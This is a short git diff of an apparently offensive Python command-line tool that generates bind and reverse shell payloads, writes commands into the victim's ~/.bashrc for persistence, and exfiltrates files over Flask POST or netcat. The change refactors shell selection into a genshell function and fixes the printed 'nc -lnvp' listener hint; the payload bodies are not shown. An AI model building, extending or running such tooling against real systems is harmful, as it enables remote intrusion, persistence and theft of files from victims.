@@ -31,9 +31,17 @@ def localexec(comm):
 	with open(f"{home}/.bashrc","a") as rc:
 		rc.write(f"\n{result}")
 
+
+
+def genshell(ip, port, protocol, shelltype, shell):
+	if shelltype == "bind":
+		return payloads.func_dict2[shell](ip, port, protocol)
+	else:
+		return payloads.func_dict[shell](ip, port, protocol)
+
 if args.command == "genshell":
 	cmd=""
-	comm=payloads.Shells.Rev.bash(args.ip, args.port, args.shell, args.protocol)
+	comm=genshell(args.ip, args.port, args.protocol, args.shelltype, args.shell)
 	routeres(comm,args.local)
 	if args.listen == "1":
 		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
@@ -50,7 +58,7 @@ if args.command == "genshell":
 					time.sleep(1)
 					sys.stdout.write("\033[A" + data.split("\n")[-1])
 	else:
-		print(f"on your machine run the following:\n\tnc -lvnp{args.port}")
+		print(f"on your machine run the following:\n\tnc -lnvp {args.port}")
 	
 if args.command == "exfilfile":
 	if args.method == "postflask":
@@ -83,7 +91,7 @@ if args.command == "exfilfile":
 						break
 							
 	if args.method == "nc":
-		print(f"on your machine run the following:\n\tnc -lvnp{args.port}")
+		print(f"on your machine run the following:\n\tnc -lnvp {args.port}")
 
 if args.command == "rfs":
 	comm=payloads.RFS.run(args.ip, args.port, args.schema)
